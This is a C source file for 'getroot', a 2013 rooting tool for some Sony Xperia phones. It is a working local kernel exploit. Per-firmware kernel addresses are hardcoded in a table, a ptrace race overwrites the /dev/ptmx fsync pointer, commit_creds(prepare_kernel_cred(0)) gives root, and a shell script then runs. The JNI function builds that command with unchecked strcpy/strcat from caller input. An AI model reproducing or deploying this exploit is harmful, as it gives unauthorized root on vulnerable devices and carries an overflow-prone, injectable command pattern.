/* getroot for Xperia acro HD or Xperia acro S */

/*
 * Copyright (C) 2013 CUBE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
/* Supported ROM version
 * [docomo SO-03D]
 * 6.1.F.0.106
 * 6.1.F.0.128
 *
 * [docomo SO-02D]
 * 6.1.F.0.117
 *
 * [docomo SO-04D]
 * 9..1.C.1.103
 *
 * [docomo SO-05D]
 * 9..1.C.1.103
 *
 * [docomo SO-01E]
 * 9..1.C.1.103
 *
 * [au IS12S]
 * 6.1.D.1.74
 * 6.1.D.1.91
 * 6.1.D.1.103
 *
 * [LT26w]
 * 6.2.B.0.200
 * 6.2.B.0.211
 * 6.2.B.1.96
 *
 * [LT26i]
 * 6..2.B.1.96
 *
*/

#define EXECCOMMAND "install_tool.sh"

#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <jni.h>
#include <string.h>
#include "getroot.h"

#define PTMX_DEVICE "/dev/ptmx"

typedef struct supported_device {
	const char *device;
	const char *build_id;
	void *prepare_kernel_cred;
	void *commit_creds;
	unsigned long int ptmx_fops;
} supported_device;

supported_device supported_devices[] = {
	{ "SO-02D","6.1.F.0.117",    (void *)0xc01b4e98,(void *)0xc01b47a0,0xc0c99830 },
	{ "SO-03D","6.1.F.0.106",    (void *)0xc01b6a40,(void *)0xc01b6348,0xc0c9b700 },
	{ "SO-03D","6.1.F.0.128",    (void *)0xc01b6a58,(void *)0xc01b6360,0xc0c9b700 },
	{ "IS12S", "6.1.D.1.74",     (void *)0xc01b6a40,(void *)0xc01b6348,0xc0c9b7b0 },
	{ "IS12S", "6.1.D.1.91",     (void *)0xc01b6a40,(void *)0xc01b6348,0xc0c9b7c0 },
	{ "IS12S", "6.1.D.1.103",    (void *)0xc01b6a58,(void *)0xc01b6360,0xc0c9b7c0 },
	{ "SO-04D","9.1.C.1.103",    (void *)0xc0095cc0,(void *)0xc00957e4,0xc0d024A0 },
	{ "SO-05D","9.1.C.1.103",    (void *)0xc00958bc,(void *)0xc00953e0,0xc0cece74 },
	{ "SO-01E","9.1.C.1.103",    (void *)0xc009844c,(void *)0xc0097f70,0xc0d03288 },
	{ "SOL22", "10.3.1.D.0.220", (void *)0xc00a2fe4,(void *)0xc00a2b08,0xc0f48600 },
	{ "LT26i", "6.2.B.1.96",     (void *)0xc00acc54,(void *)0xc00ac778,0xc0cc3780 },
	{ "LT26w", "6.2.B.1.96",     (void *)0xc00ad8a8,(void *)0xc00ad3cc,0xc0d01e90 },
	{ "LT26w", "6.2.B.0.200",    (void *)0xc00b261c,(void *)0xc00b2140,0xc0cc3dc0 },
	{ "LT26w", "6.2.B.0.211",    (void *)0xc00b262c,(void *)0xc00b2150,0xc0cc3dc0 }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
static int st_pos;

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *);
int (*commit_creds)(struct cred *);

bool bChiled;

void obtain_root_privilege(void) {
	commit_creds(prepare_kernel_cred(0));
}

static bool run_obtain_root_privilege(void *user_data) {
	int fd;

	fd = open(PTMX_DEVICE, O_WRONLY);
	fsync(fd);
	close(fd);

	return true;
}

void ptrace_write_value_at_address(unsigned long int address, void *value) {
	pid_t pid;
	long ret;
	int status;

	bChiled = false;
	pid = fork();
	if (pid < 0) {
		return;
	}
	if (pid == 0) {
		ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
		if (ret < 0) {
			fprintf(stderr, "PTRACE_TRACEME failed\n");
		}
		bChiled = true;
		signal(SIGSTOP, SIG_IGN);
		kill(getpid(), SIGSTOP);
		exit(EXIT_SUCCESS);
	}

	do {
		ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &bChiled, &bChiled);
	} while (!bChiled);

	ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &value, (void *)address);
	if (ret < 0) {
		fprintf(stderr, "PTRACE_PEEKDATA failed: %s\n", strerror(errno));
	}

	kill(pid, SIGKILL);
	waitpid(pid, &status, WNOHANG);
}

bool ptrace_run_exploit(unsigned long int address, void *value, bool (*exploit_callback)(void *user_data), void *user_data) {
	bool success;

	ptrace_write_value_at_address(address, value);
	success = exploit_callback(user_data);

	return success;
}

static bool run_exploit(void) {
	unsigned long int ptmx_fops_address;
	unsigned long int ptmx_fsync_address;

	ptmx_fops_address = supported_devices[st_pos].ptmx_fops;
	ptmx_fsync_address = ptmx_fops_address + 0x38;
	return ptrace_run_exploit(ptmx_fsync_address, &obtain_root_privilege, run_obtain_root_privilege, NULL);
}

static bool detect_injection_addresses(void)
{
  int i;
  char device[10];
  char build_id[20];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
		st_pos = i;
        return true;
    }
  }
  printf("%s (%s) is not supported.\n", device, build_id);

  return false;
}

JNIEXPORT int JNICALL Java_biz_hagurekamome_getroot_MainActivity_native_1getroot
  (JNIEnv *env, jobject jo, jstring jstr)
{
	char cachebuf[256];
	const char *execommand = "/install_tool.sh ";
	const char *param = " >/data/local/tmp/err.txt 2>&1";
	const char *str;
	int result;
	str = (*env)->GetStringUTFChars(env, jstr, 0);

	strcpy(cachebuf, str);
	strcat(cachebuf, execommand);
	strcat(cachebuf, str);
	strcat(cachebuf, param);

	pid_t pid;

	if ( !detect_injection_addresses() ){
		return -1;
	}

	prepare_kernel_cred = supported_devices[st_pos].prepare_kernel_cred;
	commit_creds = supported_devices[st_pos].commit_creds;

	run_exploit();

	if (getuid() != 0) {
		return -2;
	}

	result = system(cachebuf);
/*
	result = system("/data/data/biz.hagurekamome.jnitest/cache/install_tool.sh >/data/local/tmp/err.txt 2>&1");
*/
	if (result != 0){
		return result;
	}
	
	return 0;

}	

int main(int argc, char **argv) {
	pid_t pid;

	if ( !detect_injection_addresses() ){
		return -1;
	}

	prepare_kernel_cred = supported_devices[st_pos].prepare_kernel_cred;
	commit_creds = supported_devices[st_pos].commit_creds;

	printf("Try Get TempRoot...\n");
	run_exploit();

	if (getuid() != 0) {
		printf("Failed to getroot.\n");
		exit(EXIT_FAILURE);
	}

	printf("Succeeded in getroot!\n");
	system(EXECCOMMAND);

	exit(EXIT_SUCCESS);
	return 0;
}
